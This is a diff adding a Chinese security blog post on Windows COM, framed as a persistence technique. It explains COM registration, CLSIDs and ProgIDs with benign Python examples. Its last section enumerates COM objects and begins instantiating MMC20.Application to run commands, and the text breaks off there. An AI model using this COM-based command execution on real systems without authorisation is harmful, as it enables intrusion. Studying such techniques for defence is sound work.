@@ -1,0 +1,512 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>权限维持-COM - 东隅 Blog</title><meta name="author" content="东隅">
+<meta name="author-link" content="">
+<meta name="description" content="" /><meta name="keywords" content='攻防, 权限维持' />
+  <meta itemprop="name" content="权限维持-COM">
+  <meta itemprop="datePublished" content="2024-08-16T09:35:01+08:00">
+  <meta itemprop="dateModified" content="2024-08-16T09:35:01+08:00">
+  <meta itemprop="wordCount" content="466">
+  <meta itemprop="keywords" content="攻防,权限维持"><meta property="og:url" content="https://dongyu29.github.io/posts/%E6%94%BB%E9%98%B2/%E6%82%84%E6%82%84%E8%BF%9B%E6%9D%91/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/70/">
+  <meta property="og:site_name" content="东隅 Blog">
+  <meta property="og:title" content="权限维持-COM">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-08-16T09:35:01+08:00">
+    <meta property="article:modified_time" content="2024-08-16T09:35:01+08:00">
+    <meta property="article:tag" content="攻防">
+    <meta property="article:tag" content="权限维持">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="权限维持-COM">
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://dongyu29.github.io/posts/%E6%94%BB%E9%98%B2/%E6%82%84%E6%82%84%E8%BF%9B%E6%9D%91/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/70/" /><link rel="prev" href="https://dongyu29.github.io/posts/%E6%94%BB%E9%98%B2/%E6%82%84%E6%82%84%E8%BF%9B%E6%9D%91/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/68/" /><link rel="next" href="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/8/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "权限维持-COM",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/dongyu29.github.io\/posts\/%E6%94%BB%E9%98%B2\/%E6%82%84%E6%82%84%E8%BF%9B%E6%9D%91\/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81\/70\/"
+    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "攻防, 权限维持","wordcount":  466 ,
+    "url": "https:\/\/dongyu29.github.io\/posts\/%E6%94%BB%E9%98%B2\/%E6%82%84%E6%82%84%E8%BF%9B%E6%9D%91\/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81\/70\/","datePublished": "2024-08-16T09:35:01+08:00","dateModified": "2024-08-16T09:35:01+08:00","publisher": {
+      "@type": "Organization",
+      "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
+        "@type": "Person",
+        "name": "东隅"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ></a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ></a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
+    <ol class="breadcrumb"><li class="breadcrumb-item"><a href="/" title="东隅 Blog">Home</a></li><li class="breadcrumb-item"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" aria-current="page">权限维持-COM</li>
+    </ol>
+  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>权限维持-COM</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E6%94%BB%E9%98%B2/" class="post-category" title="Category - 攻防"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 攻防</a></span></div><div class="post-meta-line"><span title="published on 2024-08-16 09:35:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-16">2024-08-16</time></span>&nbsp;<span title="466 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 500 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>3 minutes</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content" data-end-flag="-----（完）-----"><h5 id="com" class="heading-element"><span>0.0.0.1  COM</span>
+  <a href="#com" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>com官方文档https://learn.microsoft.com/zh-cn/windows/win32/com/com-fundamentals</p>
+<blockquote>
+<p>com是一种接口标准，windows下的软件开发可以遵从com标准，也可以不遵从，对于遵从com标准的软件，我们创建它的com对象后可以通过com接口规定的方法进行一些操作，而不遵从的就不能通过com进行操作。此外，例如word = win32com.client.Dispatch(&ldquo;Word.Application&rdquo;)，这里面的Word.Application通过注册表进行注册</p>
+<p>开发者使用编程语言（如 C++、C# 等）实现 COM 对象，定义接口并实现这些接口的方法。</p>
+<p>使用工具（如 <code>regsvr32</code>）或安装程序将 COM 对象的信息注册到 Windows 注册表中。注册信息包括：CLSID（类标识符），ProgID（程序标识符），接口ID，组件的文件路径等。</p>
+</blockquote>
+<h6 id="com-的核心概念" class="heading-element"><span>0.0.0.1.1  COM 的核心概念</span>
+  <a href="#com-%e7%9a%84%e6%a0%b8%e5%bf%83%e6%a6%82%e5%bf%b5" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p><strong>COM 就是计算机世界中的“标准接口”</strong>： 在计算机中，COM（组件对象模型）就是一种类似的“标准接口”。它允许不同的软件部件（或称为组件）之间进行通信和协作，而不需要了解对方的内部实现细节。这些组件可以用不同的编程语言编写，但只要它们遵循COM标准，它们就可以互相交流。</p>
+<ol>
+<li>在设计层面，COM模型分为<code>接口</code>与<code>实现</code>。
+例如计划任务示例代码中的<code>ITaskService</code>。</li>
+<li>==区分COM组件的唯一标识为<code>Guid</code>，分别为针对接口的<code>IID（Interface IDentifier）</code>与针对类的<code>CLSID（CLaSs IDentifier）</code>==。
+例如<code>CLSID_TaskScheduler</code>定义为<code>0F87369F-A4E5-4CFC-BD3E-73E6154572DD</code>。</li>
+<li>COM组件需要在注册表内进行注册才可进行调用。通常情况下，系统预定义组件注册于<code>HKEY_LOCAL_MACHINE\SOFTWARE\Classes</code>，用户组件注册于<code>HKEY_CURRENT_USER\SOFTWARE\Classes</code>。<code>HKEY_CLASSES_ROOT</code>为二者合并后的视图，在系统服务角度等同于<code>HKEY_LOCAL_MACHINE\SOFTWARE\Classes</code>。
+例如计划任务组件的注册信息注册于<code>HKEY_CLASSES_ROOT\CLSID\{0f87369f-a4e5-4cfc-bd3e-73e6154572dd}</code>。</li>
+<li>Windows最小的可独立运行单元是进程，最小的可复用的代码单元为类库，所以COM同样存在<code>进程内（In-Process）</code>与<code>进程外（Out-Of-Process）</code>两种实现方式。多数情况下，进程外COM组件为一个exe，进程内COM组件为一个dll。
+例如计划任务的COM对象为进程内组件，由<code>taskschd.dll</code>实现。</li>
+<li>==为方便COM组件调用，可以通过<code>ProgId（Programmatic IDentifier）</code>为<code>CLSID</code>指定别名==。
+例如计划任务组件的ProgId为<code>Schedule.Service.1</code>。</li>
+<li>客户端调用<code>CoCreateInstance</code>、<code>CoCreateInstanceEx</code>、<code>CoGetClassObject</code>等函数时，将创建具有指定<code>CLSID</code>的对象实例，这个过程称为<code>激活（Activation）</code>。
+例如微软示例代码中的<code>CoCreateInstance(CLSID_TaskScheduler,....)</code>。</li>
+<li>COM采用<code>工厂模式(class factory)</code>对调用方与实现方进行解耦，包括进程内外COM组件激活、通信、转换，<code>IUnknown::QueryInterface</code>和<code>IClassFactory</code>始终贯穿其中。
+例如微软示例代码中的一大堆<code>QueryInterface</code>。</li>
+<li>com程序一般是dll文件，被提供给主程序调用。不同的com程序具有不同的接口，但是所有的接口都是从class factory 和 IUnknown接口获得的。所以com程序必须实现 class factory 和 Iunknown接口</li>
+<li>接口是实现对对象数据访问的函数集，而接口的函数称为方法。每个接口都有自己的唯一接口标识符，叫IID， IID也是一个GUID(全局唯一标识符)。
+在定义接口时，用IDL来定义，使用MIDL编译会生成对应的都文件，根据头文件我们自己实现编程调用</li>
+<li>IUnKnown接口
+所有COM接口都继承自IUnKnown接口，该接口具有3个成员函数，QueryInterface、AddRef、Release.</li>
+<li>CoCreateInstance 函数创建com实例并返回客户端请求的接口指针。客户端指的是将CLSID传递给系统并请求com对象实例的调用方，这里个人理解为编程人员的代码获取com服务器的指针，并调用接口的方法使用com服务，服务器端指的是向系统提供COM对象的模块
+com服务器主要有两种，进程内和进程外，进程内服务器在dll中实现，进程外服务器在exe中实现。
+如果要创建com对象，com服务器需要提供 IClassFactory 接口的实现，而且 IClassFactory 包含 CreateInstance方法。
+IUnknown::QueryInterface和IClassFactory始终贯穿在com组件的调用中。</li>
+<li>在注册com服务器的时候，如果是进程内注册，即dll，dll必须导出以下函数
+DllRegisterServer
+DllUnregisterServer
+注册是将com对象写进注册表，自然离不开注册表的一系列函数
+RegOpenKey
+RegCreateKey</li>
+<li>几乎所有的COM函数和接口方法都返回HRESULT类型的值，但HRESULT不是句柄</li>
+</ol>
+<p>com与注册表的关系</p>
+<pre tabindex="0"><code>HKEY_CLASSES_ROOT 用于存储一些文档类型、类、类的关联属性
+HKEY_CURRENT_CONFIG 用户存储有关本地计算机系统的当前硬件配置文件信息
+HKEY_CURRENT_USER 用于存储当前用户配置项
+HKEY_CURRENT_USER_LOCAL_SETTINGS 用于存储当前用户对计算机的配置项
+HKEY_LOCAL_MACHINE 用于存储当前用户物理状态
+HKEY_USERS 用于存储新用户的默认配置项</code></pre><p>com调用需要的值</p>
+<pre tabindex="0"><code>1.CLSID
+2.IID
+3.虚函数表
+4.方法签名</code></pre><p>整理以后制作IDL，获取到IDL之后，就可以使用合适的语言进行调用</p>
+<p>GUID 用于在系统中唯一标识一个对象，CLSID(类标识符)是GUID在注册表中的表示，用于在注册表中唯一标识一个com类对象。guid在标识接口时称为IID（接口标识符）</p>
+<p>每一个注册的clsid表项中都含有一个 <code>InprocServer32</code>的子项，该子项内有映射到该com二进制文件的键值对，操作系统通过该键值对将com二进制文件载入进程。</p>
+<p><code>InprocServer32</code>表示的是dll的实现路径，<code>LocalServer32</code>表示的是exe的实现路径</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407160931045.webp" alt="image-20240716093135890" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407160931045.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407160931045.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407160931045.webp?size=large 2x" data-title="image-20240716093135890" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h6 id="具体例子" class="heading-element"><span>0.0.0.1.2  具体例子</span>
+  <a href="#%e5%85%b7%e4%bd%93%e4%be%8b%e5%ad%90" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>例子1：Microsoft Office自动化</p>
+<p>假设你想写一个程序自动打开Microsoft Word，并在文档中输入一些文字。Microsoft Word提供了一个COM接口，让你可以通过程序控制它。</p>
+<p>用Python来实现：</p>
+<pre tabindex="0"><code>import win32com.client
+
+##### 创建一个Word应用程序的COM对象
+word = win32com.client.Dispatch(&#34;Word.Application&#34;)
+
+##### 使Word应用程序可见
+word.Visible = True
+
+##### 创建一个新文档
+doc = word.Documents.Add()
+
+##### 在文档中输入文字
+doc.Content.Text = &#34;Hello, COM world!&#34;</code></pre><p>在这个例子中，我们通过COM接口创建了一个Word对象，控制它打开了一个文档并输入了文字。</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407151726835.webp" alt="image-20240715172600633" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407151726835.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407151726835.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407151726835.webp?size=large 2x" data-title="image-20240715172600633" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>例子2：创建快捷方式</p>
+<p>你可以使用COM接口创建Windows桌面的快捷方式。</p>
+<p>用Python来实现：</p>
+<pre tabindex="0"><code>import win32com.client
+
+##### 创建Shell对象
+shell = win32com.client.Dispatch(&#34;WScript.Shell&#34;)
+
+##### 创建快捷方式对象
+shortcut = shell.CreateShortcut(&#34;C:\\path\\to\\shortcut.lnk&#34;)
+
+##### 设置快捷方式目标路径
+shortcut.TargetPath = &#34;C:\\path\\to\\target.exe&#34;
+
+##### 保存快捷方式
+shortcut.save()</code></pre><h6 id="com对象的注册和使用" class="heading-element"><span>0.0.0.1.3  COM对象的注册和使用</span>
+  <a href="#com%e5%af%b9%e8%b1%a1%e7%9a%84%e6%b3%a8%e5%86%8c%e5%92%8c%e4%bd%bf%e7%94%a8" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>####### 注册表中的 COM 信息</p>
+<p>在 Windows 注册表中，COM 对象的相关信息主要存储在以下几个关键位置：</p>
+<ol>
+<li>
+<p><strong>CLSID（Class ID）</strong>：</p>
+<ul>
+<li>==每个 COM 类都有一个唯一的类标识符（CLSID==），存储在注册表路径 <code>HKEY_CLASSES_ROOT\CLSID</code> 下。</li>
+<li>例如，Word.Application 的 CLSID 可能是 <code>{000209FF-0000-0000-C000-000000000046}</code>。</li>
+</ul>
+</li>
+<li>
+<p><strong>ProgID（Programmatic Identifier）</strong>：</p>
+<ul>
+<li>
+<p>ProgID 是一个更易读的标识符，通常是一个字符串，如 <code>Word.Application</code>。</p>
+</li>
+<li>
+<p>这些信息存储在注册表路径<code>HKEY_CLASSES_ROOT</code>下。例如：</p>
+<pre tabindex="0"><code>HKEY_CLASSES_ROOT\Word.Application</code></pre></li>
+</ul>
+</li>
+<li>
+<p><strong>接口信息</strong>：</p>
+<ul>
+<li>COM 接口的信息存储在 <code>HKEY_CLASSES_ROOT\Interface</code> 路径下。</li>
+</ul>
+</li>
+</ol>
+<p>示例</p>
+<p>假设你要注册一个名为 <code>MyComponent.MyClass</code> 的 COM 组件，可能的注册信息如下：</p>
+<p><strong>注册表信息</strong>：</p>
+<pre tabindex="0"><code>HKEY_CLASSES_ROOT
+    \MyComponent.MyClass
+        \CLSID = {12345678-1234-1234-1234-123456789012}
+    \CLSID
+        \{12345678-1234-1234-1234-123456789012}
+            \InprocServer32 = C:\Path\To\MyComponent.dll</code></pre><p>####### 注册 COM 对象的过程</p>
+<ol>
+<li>
+<p><strong>实现 COM 对象</strong>：开发者编写实现代码并生成 DLL 或 EXE 文件。</p>
+</li>
+<li>
+<p>注册 COM 对象</p>
+<ul>
+<li>
+<p>使用注册工具，如</p>
+<pre tabindex="0"><code>regsvr32</code></pre><p>，将 DLL 注册到系统中。例如：</p>
+<pre tabindex="0"><code>shell
+复制代码
+regsvr32 C:\Path\To\MyComponent.dll</code></pre></li>
+<li>
+<p>也可以通过安装程序自动完成注册过程。</p>
+</li>
+</ul>
+</li>
+</ol>
+<p>####### 使用 COM 对象</p>
+<p>当你在代码中使用 <code>win32com.client.Dispatch(&quot;Word.Application&quot;)</code> 时，以下是发生的步骤：</p>
+<ol>
+<li><strong>查找 ProgID</strong>：<code>Word.Application</code> 是 ProgID，系统在注册表中查找它对应的 CLSID。</li>
+<li><strong>查找 CLSID</strong>：找到 CLSID 后，系统查找对应的 COM 服务器位置（DLL 或 EXE）。</li>
+<li><strong>加载 COM 服务器</strong>：系统加载对应的 COM 服务器（如 <code>MSWORD.OLB</code>），并创建 COM 对象实例。</li>
+<li><strong>返回接口</strong>：返回 COM 对象的接口指针，你可以通过这个指针调用接口方法。</li>
+</ol>
+<h5 id="com利用" class="heading-element"><span>0.0.0.2  COM利用</span>
+  <a href="#com%e5%88%a9%e7%94%a8" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><h6 id="执行命令" class="heading-element"><span>0.0.0.2.1  执行命令</span>
+  <a href="#%e6%89%a7%e8%a1%8c%e5%91%bd%e4%bb%a4" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>枚举com对象</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>gwmi Win32_COMSetting | ? <span style="color:#ff636f">{</span><span style="color:#58a1dd">$_</span>.progid <span style="color:#ff636f">}</span> | sort | ft ProgId,Caption,InprocServer32</span></span></code></pre></div><p>COM接口里枚举出来的函数（如果是微软公开的话）可以到：https://docs.microsoft.com/en-us/search/?dataSource=previousVersions&amp;terms= 搜索
+例如：ExecuteShellCommand <a href="https://docs.microsoft.com/en-us/previous-versions/windows/desktop/mmc/view-executeshellcommand"target="_blank" rel="external nofollow noopener noreferrer">https://docs.microsoft.com/en-us/previous-versions/windows/desktop/mmc/view-executeshellcommand</a></p>
+<p><strong>在调用函数的时候需要注意，如果CLSID子项带有ProgID的话需要指定ProgID调用方法或属性</strong></p>
+<p>对com组件的利用可以直接使用powershell调用接口执行命令</p>
+<p>这里可以调用mmc执行命令 ，后文会讲到，mmc还支持远程调用，等到DCOM那里会提</p>
+<pre tabindex="0"><code>$handle = [activator]::CreateInstance([type]::GetTypeFromProgID(&#34;MMC20.Application.1&#34;))
